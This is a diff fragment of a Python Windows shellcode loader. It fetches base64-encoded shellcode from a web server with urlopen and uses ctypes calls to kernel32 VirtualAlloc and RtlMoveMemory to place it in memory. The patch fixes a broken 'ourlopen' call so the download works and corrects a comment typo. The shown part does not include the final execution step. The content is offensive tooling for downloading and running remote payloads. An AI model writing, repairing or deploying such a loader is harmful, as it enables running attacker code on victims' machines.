@@ -6,7 +6,7 @@ import ctypes
 kernel32 = ctypes.windll.kernel32
 
 def get_code(url):
-    with request.ourlopen(url) as response:
+    with request.urlopen(url) as response:
         # decode base64-encoded shellcode from web server
         shellcode = base64.decodebytes(response.read())
     return shellcode
@@ -18,7 +18,7 @@ def write_memory(buf):
     # this ensures the width of the memory address returned
     # matches the width of RtlMoveMemory
     kernel32.VirtualAlloc.restype   = ctypes.c_void_p
-    # Seta arguments to be two pointers and a size object
+    # Set arguments to be two pointers and a size object
     kernel32.RtlMoveMemory.argtypes = (
         ctypes.c_void_p,
         ctypes.c_void_p,
